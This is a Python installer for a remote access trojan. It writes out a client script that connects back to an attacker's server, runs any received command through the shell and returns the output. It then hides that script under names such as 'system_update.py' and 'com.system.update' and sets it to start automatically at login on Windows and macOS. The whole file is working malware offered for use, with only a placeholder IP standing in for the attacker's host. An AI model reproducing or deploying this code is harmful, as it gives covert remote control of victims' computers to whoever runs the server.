import os
import sys
import subprocess
import shutil
import platform

# This is the ROBUST client code that guarantees a response for every command.
CLIENT_CODE = """import socket
import subprocess
import os
import sys
import time

SERVER_IP = '127.0.0.0'  # REPLACE WITH YOUR SERVER IP
SERVER_PORT = 9999

def connect():
    while True:
        try:
            print(f"[*] Attempting to connect to {SERVER_IP}:{SERVER_PORT}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connection established successfully!")
            return s
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            print("[*] Waiting 10 seconds before retrying...")
            time.sleep(10)

def execute_command(command):
    """
    Executes a command and ensures output is ALWAYS returned, even for silent commands.
    """
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = process.communicate(timeout=30)
        
        output = stdout + stderr
        
        # If both are empty (silent success), generate a success message
        if not output:
            return f"[SUCCESS] Command '{command}' executed successfully. No output generated.".encode('utf-8')
        
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return f"[ERROR] Command timed out after 30 seconds.".encode('utf-8')
    except Exception as e:
        return f"[ERROR] {str(e)}".encode('utf-8')

def main():
    print("--- RAT Client Started ---")
    print("Waiting for commands. Will display received commands below.")
    
    while True:
        try:
            socket_conn = connect()
            while True:
                command = socket_conn.recv(1024).decode()
                
                if command.lower() == 'exit':
                    print("[!] Received 'exit' command. Closing connection.")
                    socket_conn.close()
                    break
                
                print(f"\\n[RECEIVED COMMAND]: {command}")

                # Execute and guarantee output
                output = execute_command(command)
                
                # Send the output
                try:
                    sent = socket_conn.send(output)
                    if sent == 0:
                        print("[!] Failed to send data. Connection broken.")
                        break
                    print(f"[*] Sent {sent} bytes of response.")
                except Exception as e:
                    print(f"[!] Error sending response: {e}")
                    break
                
        except Exception as e:
            print(f"[-] Connection lost or error occurred: {e}")
            print("[*] Reconnecting in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()
"""

def get_install_path():
    system = platform.system()
    if system == "Windows":
        return os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif system == "Darwin":
        return os.path.expanduser("~/Library/LaunchAgents")
    elif system == "Linux":
        return "/usr/local/bin"
    return None

def install_persistence(script_path):
    system = platform.system()
    try:
        if system == "Windows":
            startup_path = get_install_path()
            dest_path = os.path.join(startup_path, "system_update.py")
            shutil.copy(script_path, dest_path)
            print(f"[+] Installed to Windows Startup: {dest_path}")
            
        elif system == "Darwin":
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.call(['launchctl', 'load', plist_path])
            print(f"[+] Installed macOS LaunchAgent: {plist_path}")
            
        elif system == "Linux":
            print("[*] Linux persistence requires root. Skipping automatic service creation for safety in this demo.")
            print(f"[!] Manual Step: Add 'python3 {script_path}' to your startup applications.")
            
    except Exception as e:
        print(f"[-] Failed to install persistence: {e}")

def main():
    print("[*] RAT Client Installer (Robust Version)")
    print("[*] Checking for Python...")
    
    if not shutil.which("python3") and not shutil.which("python"):
        print("[-] Error: Python is not installed or not in PATH. This installer cannot proceed.")
        sys.exit(1)
        
    python_cmd = "python3" if shutil.which("python3") else "python"
    
    script_name = "system_helper.py"
    script_path = os.path.join(os.getcwd(), script_name)
    
    print(f"[*] Creating {script_name}...")
    with open(script_path, "w") as f:
        f.write(CLIENT_CODE)
    
    print(f"[+] Created {script_path}")
    
    print("[*] Attempting to install persistence...")
    install_persistence(script_path)
    
    print("\n[!] CRITICAL: You must edit 'system_helper.py' and change SERVER_IP to your attacker's IP.")
    print(f"[!] To run manually for testing: {python_cmd} {script_path}")

if __name__ == "__main__":
    main()
